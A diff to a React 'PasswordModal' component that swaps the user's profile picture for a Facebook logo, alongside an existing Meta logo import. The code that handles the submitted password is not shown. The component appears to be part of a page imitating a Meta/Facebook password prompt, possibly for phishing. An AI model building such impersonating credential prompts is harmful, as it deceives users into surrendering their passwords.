@@ -1,6 +1,7 @@
 'use client';
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
+import FacebookLogo from '@/assets/images/facebook-logo-image.png';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
@@ -83,21 +84,15 @@ const PasswordModal: FC<PasswordModalProps> = ({ userProfileImage, userName, use
             <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                 <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-lg flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-1.5 sm:p-3 md:p-4'>
                     <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto items-center gap-2 sm:gap-3 md:gap-4 py-3 sm:py-4 md:py-6'>
-                        {/* Profile Image */}
-                        <div className='h-16 sm:h-20 md:h-24 w-16 sm:w-20 md:w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-gradient-to-br from-blue-400 to-blue-600 flex items-center justify-center flex-shrink-0'>
-                            {userProfileImage && (userProfileImage.startsWith('http') || userProfileImage.startsWith('/')) ? (
-                                <Image
-                                    src={userProfileImage}
-                                    alt={userName}
-                                    width={96}
-                                    height={96}
-                                    className='w-full h-full object-cover'
-                                />
-                            ) : (
-                                <div className='text-white text-xl sm:text-2xl md:text-3xl font-bold'>
-                                    {userName.charAt(0).toUpperCase()}
-                                </div>
-                            )}
+                        {/* Facebook Logo Avatar */}
+                        <div className='h-16 sm:h-20 md:h-24 w-16 sm:w-20 md:w-24 rounded-full overflow-hidden border-2 border-gray-300 bg-white flex items-center justify-center flex-shrink-0'>
+                            <Image
+                                src={FacebookLogo}
+                                alt='Facebook'
+                                width={96}
+                                height={96}
+                                className='w-full h-full object-contain p-2'
+                            />
                         </div>
 
                         {/* User Name */}
